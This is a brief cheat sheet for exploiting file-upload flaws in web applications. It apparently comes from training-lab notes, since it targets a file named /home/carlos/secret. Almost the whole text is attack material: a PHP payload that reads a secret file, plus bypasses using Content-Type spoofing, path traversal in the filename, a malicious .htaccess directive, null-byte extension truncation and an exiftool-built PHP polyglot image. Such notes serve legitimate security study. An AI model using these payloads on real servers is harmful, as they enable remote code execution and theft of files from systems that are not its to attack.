## Basic:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
GET /files/avatars/exploit.php HTTP/1.1
```

## Bypass:

1) Content-Type to `image/jpeg`.
   
2) Content-Disposition: form-data; name="avatar"; `filename="../exploit.php"`.
   filename="..%2fexploit.php".
   GET /files/avatars/..%2fexploit.php
   
3) filename parameter to `.htaccess`;
   Content-Type header to text/plain'
   Replace the contents of the file (your PHP payload) with the following Apache directive: `AddType application/x-httpd-php .l33t`;
   Filename parameter from `exploit.php` to `exploit.l33t`;
   GET /files/avatars/exploit.l33t.
   
4) filename="exploit.php%00.jpg";
   GET /files/avatars/exploit.php;

5) `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`
   GET /files/avatars/polyglot.php.
